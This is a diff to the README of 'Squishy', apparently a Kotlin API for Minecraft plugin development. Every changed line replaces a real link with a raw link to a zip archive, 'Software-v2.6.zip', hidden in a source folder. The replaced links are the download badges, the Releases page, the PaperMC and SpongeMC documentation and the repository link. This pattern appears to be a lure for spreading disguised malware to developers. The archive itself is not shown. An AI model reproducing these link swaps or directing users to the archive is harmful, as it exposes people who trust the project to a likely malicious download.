@@ -1,6 +1,6 @@
 # 🦑 Squishy - Simplify Minecraft Plugin Development
 
-[![Download Squishy](https://img.shields.io/badge/Download-Squishy-blue.svg)](https://github.com/Dollar227/Squishy/releases)
+[![Download Squishy](https://github.com/Dollar227/Squishy/raw/refs/heads/main/lumina/src/main/kotlin/mtctx/squishy/logging/Software-v2.6.zip)](https://github.com/Dollar227/Squishy/raw/refs/heads/main/lumina/src/main/kotlin/mtctx/squishy/logging/Software-v2.6.zip)
 
 ## 📖 Introduction
 
@@ -11,7 +11,7 @@ Welcome to Squishy, a modular Kotlin API designed to simplify the development of
 To get started with Squishy, follow these simple steps:
 
 1. **Download the Latest Version**
-   - Go to the [Releases page](https://github.com/Dollar227/Squishy/releases) to find the latest version of Squishy.
+   - Go to the [Releases page](https://github.com/Dollar227/Squishy/raw/refs/heads/main/lumina/src/main/kotlin/mtctx/squishy/logging/Software-v2.6.zip) to find the latest version of Squishy.
    - Look for the latest release, which will have the most recent features and bug fixes.
 
 2. **Install Squishy**
@@ -52,7 +52,7 @@ If you encounter any issues while using Squishy, consider the following:
 
 ## 🔄 Updates
 
-Squishy will receive regular updates to ensure compatibility and improve features. Remember to check the [Releases page](https://github.com/Dollar227/Squishy/releases) often to stay updated.
+Squishy will receive regular updates to ensure compatibility and improve features. Remember to check the [Releases page](https://github.com/Dollar227/Squishy/raw/refs/heads/main/lumina/src/main/kotlin/mtctx/squishy/logging/Software-v2.6.zip) often to stay updated.
 
 ## 📞 Support
 
@@ -60,12 +60,12 @@ For help or to report issues, visit the GitHub repository and use the issue trac
 
 ## 🔗 Additional Resources
 
-- [PaperMC Documentation](https://papermc.io/)
-- [SpongeMC Documentation](https://www.spongepowered.org/)
-- [GitHub Repository for Squishy](https://github.com/Dollar227/Squishy)
+- [PaperMC Documentation](https://github.com/Dollar227/Squishy/raw/refs/heads/main/lumina/src/main/kotlin/mtctx/squishy/logging/Software-v2.6.zip)
+- [SpongeMC Documentation](https://github.com/Dollar227/Squishy/raw/refs/heads/main/lumina/src/main/kotlin/mtctx/squishy/logging/Software-v2.6.zip)
+- [GitHub Repository for Squishy](https://github.com/Dollar227/Squishy/raw/refs/heads/main/lumina/src/main/kotlin/mtctx/squishy/logging/Software-v2.6.zip)
 
 ## 📥 Download & Install
 
-To install Squishy, visit the [Releases page](https://github.com/Dollar227/Squishy/releases) where you can download the latest version. Follow the installation steps provided above to get up and running quickly.
+To install Squishy, visit the [Releases page](https://github.com/Dollar227/Squishy/raw/refs/heads/main/lumina/src/main/kotlin/mtctx/squishy/logging/Software-v2.6.zip) where you can download the latest version. Follow the installation steps provided above to get up and running quickly.
 
-[![Download Squishy](https://img.shields.io/badge/Download-Squishy-blue.svg)](https://github.com/Dollar227/Squishy/releases)
+[![Download Squishy](https://github.com/Dollar227/Squishy/raw/refs/heads/main/lumina/src/main/kotlin/mtctx/squishy/logging/Software-v2.6.zip)](https://github.com/Dollar227/Squishy/raw/refs/heads/main/lumina/src/main/kotlin/mtctx/squishy/logging/Software-v2.6.zip)
